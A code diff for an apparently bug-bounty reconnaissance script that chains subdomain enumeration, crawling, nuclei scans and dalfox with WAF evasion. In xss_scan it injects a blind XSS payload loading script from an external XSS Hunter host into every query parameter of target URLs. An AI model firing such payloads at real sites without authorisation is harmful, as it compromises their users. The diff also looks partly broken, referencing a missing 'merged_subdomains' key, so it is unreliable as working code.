@@ -14,14 +14,13 @@ import shlex
 import time
 import random
 from typing import Optional, List, Tuple
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote_plus, urlunparse, unquote
 import sys
 import requests
 import urllib3 
 import traceback
 import hashlib
 import dns.resolver
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ANSI color codes
@@ -37,17 +36,52 @@ class Colors:
     UNDERLINE = '\033[4m'
 
 extra_header = ""
+headers = {
+    "User-Agent": (
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+        "AppleWebKit/537.36 (KHTML, like Gecko) "
+        "Chrome/116.0.0.0 Safari/537.36"
+    ),
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate",
+    "Connection": "close",
+    "Upgrade-Insecure-Requests": "1"
+}
+
+filenames = {
+    "findomain": "{}.findomain.txt",
+    "amass": "{}.amass.txt",
+    "alive_subs" : "{}.alive_subs.txt",
+    "gau" : "{}.gau.txt",
+    "katana" : "{}.katana_results.txt",
+    "unique_urls": "{}.unique_urls.txt",
+    "alive_urls": "{}.alive_urls.txt",
+    "sorted": "{}.sorted_urls.txt",
+    "pretty_httpx": "{}.pretty_httpx.txt",
+    "httpx_tech" : "{}.httpx_tech.txt",
+    "sorted_urls" : "{}.sorted_urls.txt",
+
+    "nuclei": "{}.nuclei_results.txt",
+    "query_only": "{}.queries.txt",
+    "xss_blind": "{}.blind_xss_urls.txt",
+    "xss_payloads": "{}.xss_payloads.txt",
+    "xss_results": "{}.xss_results.txt",
+}
+
 REDIRECT_CODES = {300,301,302,303,307,308}
 SKIP_GOBUSTER = False
 
 # Gobuster defaults (can be overridden via CLI)
-GOBUSTER_WORDLIST = "/home/mci/ctf/theballmarcus-payloads/wordlists/Web/Endpoints/sensitive_endpoints.txt"
-GOBUSTER_THREADS = 2
+GOBUSTER_WORDLIST = os.getenv("GOBUSTER_WORDLIST", "/usr/share/seclists/Discovery/Web-Content/common.txt")
 GOBUSTER_PROXY: Optional[str] = None
+
+# ENV variables
+XSS_HUNTER_DOMAIN = os.getenv("XSS_HUNTER_DOMAIN", "")
 
 KNOWN_TECHS = {
     "wordpress": {
-        "nuclei_templates": "",
+        "nuclei_templates": "github/topscoder/nuclei-wordfence-cve",
         "nuclei_cves": "",
         "nuclei_tags": "wordpress"
     },
@@ -147,6 +181,36 @@ KNOWN_TECHS = {
         "nuclei_tags": "cisco"
     }
 }
+
+def normalize_url(url: str) -> str:
+    try:
+        # Decode percent-encoded characters (e.g. %5C → \)
+        url = unquote(url)
+
+        # Replace all backslashes with forward slashes
+        url = url.replace('\\', '/')
+
+        # Parse the URL to isolate and clean the path
+        parsed = urlparse(url)
+
+        # Collapse multiple slashes in the path
+        cleaned_path = re.sub(r'/+', '/', parsed.path)
+
+        # Rebuild and return normalized URL
+        normalized = urlunparse((
+            parsed.scheme,
+            parsed.netloc,
+            cleaned_path,
+            parsed.params,
+            parsed.query,
+            parsed.fragment
+        ))
+
+        return normalized
+    except Exception as e:
+        print(f"Error normalizing URL: {url} - {e}")
+        return url
+
 def enumerate_domains(pretty_httpx_file: Path, base_dir: Path, threads: int, proxy: Optional[str], wordlist: str):
     """Replicates enumerate_domains_2 bash logic in Python.
 
@@ -336,11 +400,13 @@ def unmap_with_sourcemapper(map_file: Path, output_dir: Path):
         print(f"✗ Unexpected error during unmapping: {e}")
         return False
 
-def analyze_js_files(domain_folder: Path, merged_urls_file: Path):
+def analyze_js_files(domain_folder: Path, domain: str):
     js_dir = domain_folder / "js_analysis"
     js_dir.mkdir(exist_ok=True)
 
     js_urls = set()
+    merged_urls_file = domain_folder / filenames["alive_urls"].format(domain)
+
     # Step 1: extract JS URLs
     if merged_urls_file.exists():
         with merged_urls_file.open("r", encoding="utf-8", errors="ignore") as f:
@@ -593,9 +659,324 @@ def run_cmd(cmd, cwd=None, stdout_file=None, allow_empty_stdout=True, timeout=No
 def hdr():
     return f" -H {shlex.quote(extra_header)}" if extra_header else ""
 
-def process_wildcard(domain, base_dir):
+def findomain_scan(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Starting Findomain scan for {domain}{Colors.ENDC}")
+    findomain_file = filenames['findomain'].format(domain)
+    if not (folder / findomain_file).exists():
+        try:
+            run_cmd(f"findomain -t {domain} -u {findomain_file}", cwd=folder, allow_empty_stdout=True)
+            if (folder / findomain_file).exists() and (folder / findomain_file).stat().st_size > 0:
+                print(f"{Colors.OKGREEN}findomain_scan: Found subdomains, saved to {findomain_file}{Colors.ENDC}")
+                return findomain_file
+            else:
+                print(f"{Colors.WARNING}findomain_scan: No subdomains found for {domain}{Colors.ENDC}")
+                return
+        except RuntimeError as e:
+            print(f"{Colors.FAIL}findomain_scan: Error running findomain: {e}{Colors.ENDC}")
+            return
+    else:
+        print(f"{Colors.OKGREEN}findomain_scan: {findomain_file} already exists, skipping scan{Colors.ENDC}")
+        return findomain_file
 
+def amass_scan(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Starting Amass scan for {domain}{Colors.ENDC}")
+    amass_file = filenames['amass'].format(domain)
+    if not (folder / amass_file).exists():
+        try:
+            run_cmd(f"amass enum -d {domain} -o {amass_file} -passive", cwd=folder, allow_empty_stdout=True)
+            if (folder / amass_file).exists() and (folder / amass_file).stat().st_size > 0:
+                print(f"{Colors.OKGREEN}amass_scan: Found subdomains, saved to {amass_file}{Colors.ENDC}")
+                return amass_file
+            else:
+                print(f"{Colors.WARNING}amass_scan: No subdomains found for {domain}{Colors.ENDC}")
+                return
+        except RuntimeError as e:
+            print(f"{Colors.FAIL}amass_scan: Error running amass: {e}{Colors.ENDC}")
+            return
+    else:
+        print(f"{Colors.OKGREEN}amass_scan: {amass_file} already exists, skipping scan{Colors.ENDC}")
+        return amass_file
 
+def merge_subdomains(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Merging subdomain files for {domain}{Colors.ENDC}")
+    findomain_file = filenames['findomain'].format(domain)
+    amass_file = filenames['amass'].format(domain)
+    merged_file = filenames['merged_subdomains'].format(domain)
+
+    if not (folder / merged_file).exists():
+        existing_files = []
+        if (folder / findomain_file).exists():
+            existing_files.append(findomain_file)
+
+        if (folder / amass_file).exists():
+            existing_files.append(amass_file)
+
+        if existing_files == []:
+            print(f"{Colors.WARNING}merge_subdomains: No input files found ({findomain_file}, {amass_file}), skipping{Colors.ENDC}")
+            return
+        
+        run_cmd(f"cat {' '.join(existing_files)} | sort -u | dnsx -silent -a -o {merged_file}", cwd=folder, allow_empty_stdout=True)
+
+        print(f"{Colors.OKGREEN}merge_subdomains: Merged {existing_files} unique subdomains into {merged_file}{Colors.ENDC}")
+        return merged_file
+    else:
+        print(f"{Colors.OKGREEN}merge_subdomains: {merged_file} already exists, skipping merge{Colors.ENDC}")
+        return merged_file
+
+def merge_httpx_files(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Merging HTTPX files for {domain}{Colors.ENDC}")
+    gau_file = filenames['gau'].format(domain)
+    katana_file = filenames['katana'].format(domain)
+    unique_urls_file = filenames['unique_urls'].format(domain)
+    alive_urls_file = filenames['alive_urls'].format(domain)
+    
+    def process_line(line):
+        line = normalize_url(line)
+        path = line.split("?")[0].strip()
+        if path not in seen:
+            seen.add(path)
+            try:
+                parsed = urlparse(line)
+                host = parsed.hostname or ""
+                if host.endswith(domain):
+                    return line.strip()
+                
+            except Exception:
+                print(f"{Colors.WARNING}Invalid URL skipped: {line.strip()}{Colors.ENDC}")
+
+    seen = set()
+    if not (folder / gau_file).exists() and not (folder / katana_file).exists():
+        print(f"{Colors.WARNING}merge_httpx_files: No input files found ({gau_file}, {katana_file}), skipping{Colors.ENDC}")
+        return
+    if not (folder / unique_urls_file).exists():
+        if (folder / gau_file).exists():
+            with (folder / gau_file).open('r', errors="ignore") as fg:
+                for line in fg:
+                    processed = process_line(line)
+                    if processed:
+                        seen.add(processed)
+        if (folder / katana_file).exists():
+            with (folder / katana_file).open('r', errors="ignore") as fk:
+                for line in fk:
+                    processed = process_line(line)
+                    if processed:
+                        seen.add(processed)
+        with (folder / unique_urls_file).open('w') as fu:
+            for url in seen:
+                fu.write(url + "\n")
+        print(f"{Colors.OKGREEN}merge_httpx_files: Merged {len(seen)} unique URLs into {unique_urls_file}{Colors.ENDC}")
+    else:
+        print(f"{Colors.OKGREEN}merge_httpx_files: {unique_urls_file} already exists, skipping merge{Colors.ENDC}")
+    
+    if not (folder / alive_urls_file).exists():
+        if (folder / unique_urls_file).exists():
+            alive_cmd = f"httpx -rate-limit 4 -o {alive_urls_file}{hdr()}"
+            run_cmd(f"cat {unique_urls_file} | {alive_cmd}", cwd=folder, allow_empty_stdout=True)
+            print(f"{Colors.OKGREEN}merge_httpx_files: Created alive URLs file {alive_urls_file}{Colors.ENDC}")
+            return alive_urls_file
+        else:
+            print(f"{Colors.WARNING}merge_httpx_files: {unique_urls_file} missing, cannot create {alive_urls_file}{Colors.ENDC}")
+
+def nuclei_scan(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Starting nuclei scan for {domain}{Colors.ENDC}")
+    nuclei_file = filenames['nuclei'].format(domain)
+    pretty_httpx_file = filenames['pretty_httpx'].format(domain)
+
+    if not (folder / pretty_httpx_file).exists():
+        print(f"{Colors.WARNING}nuclei_scan: pretty_httpx file {pretty_httpx_file} missing, skipping{Colors.ENDC}")
+        return
+
+    techs = set()
+    targets: List[str] = []
+    seen = set()
+
+    if (folder / pretty_httpx_file).stat().st_size > 0 and not (folder / nuclei_file).exists():
+        with (folder / pretty_httpx_file).open("r", errors="ignore") as f:
+            for line in f:
+                if not line.strip():
+                    continue
+                url = line.split()[0]
+                if url not in seen:
+                    seen.add(url)
+                    targets.append(url)
+
+                tech_matches = re.findall(r"\[.+?\]", line)
+                for tech in KNOWN_TECHS:
+                    for attempt_tech in tech_matches:
+                        if tech.lower() in attempt_tech.lower():
+                            techs.add(tech)
+                            
+        if techs:
+            nuclei_tags = f",".join(KNOWN_TECHS[tech]['nuclei_tags'] for tech in techs)
+            nuclei_templates = ','.join(KNOWN_TECHS[tech]['nuclei_templates'] for tech in techs)
+
+            # TODO: implement nuclei cve's and other options
+            print(f"{Colors.OKBLUE}{Colors.BOLD}Nuclei scan for {url} with techs: {', '.join(techs)}{Colors.ENDC}")
+            nuclei_urls = ",".join(f"{url}" for url in targets)
+            nuclei_command = f"nuclei -u {nuclei_urls} -o {nuclei_file} --tags default,{nuclei_tags} --templates {nuclei_templates}{hdr()}"
+            print(nuclei_command)
+            run_cmd(nuclei_command, cwd=folder, allow_empty_stdout=True)
+            return nuclei_file
+
+        else:
+            print(f"{Colors.WARNING}No known techs detected for nuclei scan on {url}{Colors.ENDC}")
+            return
+
+def create_query_only_file(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Creating query-only URL file for {domain}{Colors.ENDC}")
+    input_file = filenames['alive_urls'].format(domain)
+    output_file = filenames['query_only'].format(domain)
+
+    if not (folder / input_file).exists():
+        print(f"{Colors.WARNING}create_query_only_file: input file {input_file} missing, skipping{Colors.ENDC}")
+        return
+
+    seen = set()
+    with (folder / input_file).open("r", errors="ignore") as fin, (folder / output_file).open("w") as fout:
+        for line in fin:
+            url = line.strip().split()[0]
+            if url and "=" in url and url not in seen:
+                seen.add(url)
+                fout.write(url + "\n")
+
+    if (folder / output_file).stat().st_size == 0:
+        (folder / output_file).unlink()
+        print(f"{Colors.WARNING}create_query_only_file: No injectable URLs found in {input_file}, skipping creation of {output_file}{Colors.ENDC}")
+    else:
+        print(f"{Colors.OKGREEN}create_query_only_file: Created {output_file} with {len(seen)} injectable URLs{Colors.ENDC}")
+    return output_file
+
+def xss_scan(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Starting XSS scan for {domain}{Colors.ENDC}")
+    output_file = filenames['xss_results'].format(domain)
+    blind_file = filenames['xss_blind'].format(domain)
+    alive_query_file = filenames['query_only'].format(domain)
+
+    if not XSS_HUNTER_DOMAIN:
+        print(f"{Colors.WARNING}xss_scan: XSS_HUNTER_DOMAIN not set, skipping{Colors.ENDC}")
+        return
+
+    xss_hunter_payload = f"<script src='https://{XSS_HUNTER_DOMAIN}/abc.js'></script>"
+
+    if not (folder / alive_query_file).exists():
+        print(f"{Colors.WARNING}xss_scan: file {alive_query_file} missing, skipping{Colors.ENDC}")
+        return
+
+    print(f"{Colors.OKBLUE}{Colors.BOLD}Running Dalfox scan on URLs for {domain}...{Colors.ENDC}")
+
+    dalfox_cmd = f"dalfox file {alive_query_file} --output {output_file} --delay 200 --worker 10 --waf-evasion --skip-mining-all --skip-mining-all --skip-bav {hdr()}"
+    run_cmd(dalfox_cmd, cwd=folder, allow_empty_stdout=True)
+
+    # Step 2: blind xss
+    print(f"{Colors.OKBLUE}{Colors.BOLD}Injecting Blind XSS payloads...{Colors.ENDC}")
+    with (folder / alive_query_file).open("r") as f:
+        for line in f:
+            parsed = urlparse(line)
+            query = parse_qs(parsed.query)
+            injected_query = {k: xss_hunter_payload for k in query}
+            new_query = urlencode(injected_query, doseq=True)
+            new_url = urlunparse(parsed._replace(query=new_query))
+
+            try:
+                thisHeaders = headers.copy()
+                if extra_header:
+                    thisHeaders[extra_header.split(':')[0]] = extra_header.split(':')[1][1:]
+                response = requests.get(new_url, headers=thisHeaders, timeout=4, verify=False)
+                print(f"{Colors.OKBLUE}Sent blind XSS payload to: {new_url} [Status: {response.status_code}]{Colors.ENDC}")
+            except requests.RequestException as e:
+                print(f"{Colors.WARNING}Request failed for {new_url}: {e}{Colors.ENDC}")
+
+    print(f"{Colors.OKCYAN}Blind XSS payloads sent. Monitor your XSS Hunter dashboard.{Colors.ENDC}")
+    print(f"{Colors.OKGREEN}XSS Scan completed. Results saved to:{Colors.ENDC}")
+    print(f"  - {output_file}   (Reflected/Stored XSS)")
+    print(f"  - {blind_file}    (Blind XSS URLs)")
+
+    return output_file
+
+def run_gau(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Running gau for {domain}{Colors.ENDC}")
+    urls_file = filenames['gau'].format(domain)
+    alive_subs_file = filenames['alive_subs'].format(domain)
+    if not (folder / alive_subs_file).exists():
+        print(f"{Colors.WARNING}gau_only: file {alive_subs_file} missing, skipping{Colors.ENDC}")
+        return
+
+    if (folder / alive_subs_file).stat().st_size > 0 and not (folder / urls_file).exists():
+        run_cmd(f"cat {alive_subs_file} | gau > {urls_file}", cwd=folder)
+        return folder / urls_file
+    else:
+        print(f"{Colors.WARNING}gau_only: No alive subdomains found in {alive_subs_file}, skipping gau{Colors.ENDC}")
+        return
+
+def run_katana(folder: Path, domain: str, single_domain = False):
+    print(f"{Colors.HEADER}{Colors.BOLD}Running katana for {domain}{Colors.ENDC}")
+    katana_file = filenames['katana'].format(domain)
+    alive_subs_file = filenames['alive_subs'].format(domain)
+    if not (folder / alive_subs_file).exists():
+        print(f"{Colors.WARNING}katana_only: file {alive_subs_file} missing, skipping{Colors.ENDC}")
+        return
+
+    if (folder / alive_subs_file).stat().st_size > 0 and not (folder / katana_file).exists():
+        katana_base = f"katana -list {alive_subs_file} -o {katana_file} -fs fqdn -d 3 -jc -kf all -silent{hdr()}"
+        try:
+            run_cmd(f"timeout 30m {katana_base}", cwd=folder, allow_empty_stdout=True)
+
+        except RuntimeError as e:
+            print(f"{Colors.WARNING}Katana failed or timed out: {e}{Colors.ENDC}")
+            if not (folder / katana_file).exists():
+                open(folder / katana_file, "w").close()
+        return folder / katana_file
+    else:
+        print(f"{Colors.WARNING}katana_only: No alive subdomains found in {alive_subs_file}, skipping katana{Colors.ENDC}")
+        return
+
+def httpx_tech_detect(folder: Path, domain: str):
+    httpx_tech_file = filenames['httpx_tech'].format(domain)
+    alive_subs_file = filenames['alive_subs'].format(domain)
+    print(folder / alive_subs_file)
+    if not (folder / alive_subs_file).exists():
+        print(f"{Colors.WARNING}httpx_tech_detect: file {alive_subs_file} missing, skipping{Colors.ENDC}")
+        return
+
+    if (folder / alive_subs_file).stat().st_size > 0 and not (folder / httpx_tech_file).exists():
+        httpx_cmd = f"httpx -hc -cl -tech-detect -title {hdr()}"
+        run_cmd(f"cat {alive_subs_file} | {httpx_cmd} > {httpx_tech_file}", cwd=folder)
+        return folder / httpx_tech_file
+    else:
+        print(f"{Colors.WARNING}httpx_tech_detect: No alive subdomains found in {alive_subs_file}, skipping httpx tech detect{Colors.ENDC}")
+        return
+
+def pretty_httpx(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Generating pretty_httpx for {domain}{Colors.ENDC}")
+    subs_file = filenames['merged_subdomains'].format(domain)
+    pretty_httpx = filenames['pretty_httpx'].format(domain)
+
+    if not (folder / pretty_httpx).exists() and (folder / subs_file).exists():
+        run_cmd(
+            f"cat {subs_file} | httpx -silent -title -status-code -content-length -tech-detect -follow-redirects -location -o {pretty_httpx}{hdr()}",
+            cwd=folder
+        )
+
+def sort_all_urls(folder: Path, domain: str):
+    print(f"{Colors.HEADER}{Colors.BOLD}Sorting URLs for {domain}{Colors.ENDC}")
+    input_file = filenames['alive_urls'].format(domain)
+    output_file = filenames['sorted_urls'].format(domain)
+
+    if not (folder / input_file).exists():
+        print(f"{Colors.WARNING}sort_urls: input file {input_file} missing, skipping{Colors.ENDC}")
+        return
+    if (folder / output_file).exists():
+        print(f"{Colors.OKGREEN}sort_urls: output file {output_file} already exists, skipping{Colors.ENDC}")
+        return
+    
+    sorted_dir = folder / "sorted_urls"
+    if not (folder / "sorted_urls.txt").exists():
+        try:
+            sort_urls(folder / input_file, sorted_dir)
+        except Exception as e:
+            print(f"{Colors.WARNING}sort_urls failed: {e}{Colors.ENDC}")
+
+def process_wildcard(domain, base_dir, processed_urls = set()):
     print(f"{Colors.HEADER}{Colors.BOLD}Processing: {domain}{Colors.ENDC}")
     clean_domain = domain.replace("*.", "").strip()
     try:
@@ -608,104 +989,43 @@ def process_wildcard(domain, base_dir):
     folder.mkdir(parents=True, exist_ok=True)
 
     subs_file = f"{ascii_domain}.txt"
-    alive_subs_file = f"{ascii_domain}_alive.txt"
-    urls_file = "urls"
     alive_file = "alive_urls"
-    katana_file = "katana_urls"
-    merged_urls_file = "all_urls"
-    amass_file = "amass.txt"
     pretty_httpx = "pretty_httpx.txt"
 
     # 1: findomain (creates subs file automatically with -o)
-    if not (folder / subs_file).exists():
-        run_cmd(f"findomain -t {ascii_domain} -r -o", cwd=folder)
-
-        generated = folder / f"{ascii_domain}.txt"
-        if not generated.exists():
-            txts = list(folder.glob("*.txt"))
-            if txts:
-                txts[0].rename(generated)
+    findomain_scan(folder, ascii_domain)
 
     # 2: amass merge
-    if not (folder / amass_file).exists() and not (folder / alive_subs_file).exists():
-        try:
-            run_cmd(f"amass enum -d {ascii_domain} -o {amass_file}", cwd=folder)
-            run_cmd(f"cat {subs_file} {amass_file} | sort -u | dnsx -silent -a -o {alive_subs_file}", cwd=folder)
-        except RuntimeError as e:
-            print(f"{Colors.WARNING}Amass failed: {e}{Colors.ENDC}")
+    amass_scan(folder, ascii_domain)
+    
+    # 2b: merge findomain + amass
+    merge_subdomains(folder, ascii_domain)
 
-    # httpx alive subdomains only
-    if (folder / alive_subs_file).exists() and not (folder / f"{alive_subs_file}.services").exists():
-        httpx_cmd = f"httpx -hc -cl -tech-detect -title -silent{hdr()}"
-        run_cmd(f"cat {alive_subs_file} | {httpx_cmd} > {alive_subs_file}.services", cwd=folder)
+    # Step 3: httpx tech detect and alive
+    httpx_tech_detect(folder, ascii_domain)
 
     # 3: gau
-    if not (folder / urls_file).exists():
-        run_cmd(f"cat {alive_subs_file} | gau > {urls_file}", cwd=folder)
+    run_gau(folder, ascii_domain)
 
     # 4: katana
-    if not (folder / katana_file).exists():
-        if (folder / alive_subs_file).exists() and os.path.getsize(folder / alive_subs_file) > 0:
-            katana_base = f"katana -list {alive_subs_file} -o {katana_file} -fs fqdn -d 3 -jc -kf all -silent{hdr()}"
-            try:
-                run_cmd(f"timeout 30m {katana_base}", cwd=folder, allow_empty_stdout=True)
-
-            except RuntimeError as e:
-                print(f"{Colors.WARNING}Katana failed or timed out: {e}{Colors.ENDC}")
-                if not (folder / katana_file).exists():
-                    open(folder / katana_file, "w").close()
-        else:
-            open(folder / katana_file, "w").close()
+    run_katana(folder, ascii_domain)
 
     # 5: Filter unique paths and domains that are not the base_domain variable and merge
-    unique_paths_file = folder / "unique_paths.txt"
-    if not unique_paths_file.exists():
-        with open(folder / urls_file, "r") as infile, open(folder / katana_file, "r") as kfile, open(unique_paths_file, "w") as outfile:
-            seen = set()
-            def process_line(line):
-                path = line.split("?")[0].strip()
-                if path not in seen:
-                    seen.add(path)
-                    try:
-                        parsed = urlparse(line)
-                        host = parsed.hostname or ""
-                        if host.endswith(ascii_domain) or host.endswith(clean_domain):
-                            outfile.write(path + "\n")
-                    except Exception:
-                        print(f"{Colors.WARNING}Invalid URL skipped: {line.strip()}{Colors.ENDC}")
-
-            for line in kfile:
-                process_line(line)
-            for line in infile:
-                process_line(line)
-
-    # 6: httpx alive
-    if not (folder / alive_file).exists():
-        httpx_cmd = f"httpx -silent{hdr()}"
-        run_cmd(f"cat {unique_paths_file.name} | {httpx_cmd} > {alive_file}", cwd=folder)
+    merge_httpx_files(folder, ascii_domain)    
 
     # 7: JS analyzsis
     try:
-        js_stats = analyze_js_files(folder, folder / alive_file)
+        js_stats = analyze_js_files(folder, ascii_domain)
         if js_stats.get("dir"):
             print(f"{Colors.OKGREEN}JS analysis found {js_stats['secrets_found']} secrets and {js_stats['endpoints_extracted']} endpoints in {js_stats['js_urls_checked']} JS files.{Colors.ENDC}")
     except Exception as e:
         print(f"{Colors.WARNING}JS analysis failed: {e}{Colors.ENDC}")
 
     # 8: classify/sort
-    sorted_dir = folder / "sorted_urls"
-    if not (folder / "sorted_urls.txt").exists():
-        try:
-            sort_urls(folder / alive_file, sorted_dir)
-        except Exception as e:
-            print(f"{Colors.WARNING}sort_urls failed: {e}{Colors.ENDC}")
+    sort_all_urls(folder, ascii_domain)
 
     # 9: pretty httpx per subdomain (tech + status)
-    if not (folder / pretty_httpx).exists() and (folder / subs_file).exists():
-        run_cmd(
-            f"cat {subs_file} | httpx -silent -title -status-code -content-length -tech-detect -follow-redirects -location -o {pretty_httpx}{hdr()}",
-            cwd=folder
-        )
+    pretty_httpx(folder, ascii_domain)
 
     # 10: light sensitive endpoint enumeration (optional, ignore failures)
     try:
@@ -720,49 +1040,39 @@ def process_wildcard(domain, base_dir):
 
 def process_url(url, base_dir):
     print(f"{Colors.HEADER}{Colors.BOLD}Processing URL: {url}{Colors.ENDC}")
-    parsed = urlparse(url)
     folder = base_dir / "urls"
     folder.mkdir(parents=True, exist_ok=True)
 
     if "http" in url.lower() or "/" in url or "'" in url:
         print(f"{Colors.FAIL}Dangerous input. Please no protocols in the input{Colors.ENDC}")
         return
-    
-    urlFile = f"{url}.txt"
-    nucleiFile = f"{url}_nuclei.txt"
-    # List of known techs for nuclei scan templates 
+
+    # Step 0: small hack to create alive_subs_file
+    alive_subs_file = folder / filenames['alive_subs'].format(url)
+    print(alive_subs_file)
+    if not alive_subs_file.exists():
+        with open(alive_subs_file, "w") as f:
+            f.write(f"{url}\n")
 
     # Step 1: httpx tech detect and alive
-    if not (folder / urlFile).exists():
-        httpx_cmd = f"httpx -silent -title -status-code -content-length -tech-detect -nc {hdr()}"
-        run_cmd(f"echo '{shlex.quote(url)}' | {httpx_cmd} > {urlFile}", cwd=folder)
-    
-    # Step 2: nuclei scan based on techs
-    if (folder / urlFile).exists() and (folder / urlFile).stat().st_size > 0 and not (folder / nucleiFile).exists():
-        techs = set()
-        schemes = set()
-        with open(folder / urlFile, "r", encoding="utf-8", errors="ignore") as f:
-            for line in f:
-                if line.startswith("https://"):
-                    schemes.add("https://")
-                elif line.startswith("http://"):
-                    schemes.add("http://")
+    httpx_tech_detect(folder, url)
 
-                tech_matches = re.findall(r"\[.+?\]", line)
-                for tech in KNOWN_TECHS:
-                    for attempt_tech in tech_matches:
-                        if tech.lower() in attempt_tech.lower():
-                            techs.add(tech)
-        if techs:
-            nuclei_tags = ",".join(tech for tech in techs)
-            # TODO: implement nuclei cve's and other options
-            print(f"{Colors.OKBLUE}{Colors.BOLD}Nuclei scan for {url} with techs: {', '.join(techs)}{Colors.ENDC}")
-            nuclei_urls = ",".join(f"{scheme}{url}" for scheme in schemes)
-            nuclei_command = f"nuclei -u {nuclei_urls} -o {nucleiFile} --tags default,{nuclei_tags}{hdr()}"
-            print(nuclei_command)
-            run_cmd(nuclei_command, cwd=folder, allow_empty_stdout=True)
-        else:
-            print(f"{Colors.WARNING}No known techs detected for nuclei scan on {url}{Colors.ENDC}")
+    # Step 2: gau
+    run_gau(folder, url)
+
+    # Step 3: katana
+    run_katana(folder, url, single_domain=True)
+
+    # Step 4: merge httpx files
+    merge_httpx_files(folder, url)
+
+    # Step 5: nuclei scan based on techs
+    nuclei_scan(folder, url)
+
+    # Step 6: xss scan if applicable
+    create_query_only_file(folder, url)
+    if (folder / filenames['query_only'].format(url)).exists() and (folder / filenames['query_only'].format(url)).stat().st_size > 0:
+        xss_scan(folder, url)
     
 def parse_pretty_httpx(path: Path):
     results = []
@@ -965,7 +1275,6 @@ def main():
     parser.add_argument("--json", default="assets.json", help="Path to assets JSON file")
     parser.add_argument("--header", default=None, help="Optional program header (e.g. auth cookie)")
     parser.add_argument("--workers", type=int, default=3, help="Concurrent domains")
-    parser.add_argument("--keep", action="store_true", help="Keep temp directory (default keeps anyway)")
     parser.add_argument("--gobuster-threads", type=int, default=2, help="Threads for gobuster (enumeration phase)")
     parser.add_argument("--gobuster-proxy", default=None, help="Optional proxy for gobuster (e.g. http://localhost:1340)")
     parser.add_argument("--gobuster-wordlist", default=GOBUSTER_WORDLIST, help="Wordlist for gobuster directory enumeration")
@@ -974,6 +1283,7 @@ def main():
     parser.add_argument("--specific-domain", default=None, help="For testing: process only this specific domain from the JSON")
     parser.add_argument("--only-urls", action="store_true", help="Process only URLs from the JSON, skip wildcards")
     parser.add_argument("--only-wildcards", action="store_true")
+    parser.add_argument("--dry-run", action="store_true", help="Dry run mode, do not execute commands")
     args = parser.parse_args()
 
     if args.use_existing_dir:
@@ -1020,19 +1330,29 @@ def main():
         and entry.get("Asset")
     ]
 
+    if args.dry_run:
+        print(f'{Colors.FAIL}DRY RUN!{Colors.ENDC}')
+        return
+    
     SKIP_GOBUSTER = args.skip_gobuster
     if not args.only_wildcards:
         with ThreadPoolExecutor(max_workers=args.workers) as executor:
-            futures = {executor.submit(process_url, u, run_dir): u for u in urls}
+            futures = {executor.submit(process_url, u, run_dir): u for u in urls if (not args.specific_domain) or (u == args.specific_domain)}
             for fut in as_completed(futures):
                 url = futures[fut]
                 try:
                     fut.result()
                 except Exception as e:
                     print(f"{Colors.FAIL}{Colors.BOLD}URL {url} failed: {e}{Colors.ENDC}")
+                    traceback.print_exc()
+
     if not args.only_urls:
+        if args.only_wildcards:
+            processed_urls = set()
+        else:
+            processed_urls = set(urls)
         with ThreadPoolExecutor(max_workers=args.workers) as executor:
-            futures = {executor.submit(process_wildcard, d, run_dir): d for d in domains if (not args.specific_domain) or (d == args.specific_domain)}
+            futures = {executor.submit(process_wildcard, d, run_dir, processed_urls): d for d in domains if (not args.specific_domain) or (d == args.specific_domain)}
             for fut in as_completed(futures):
                 dom = futures[fut]
                 try:
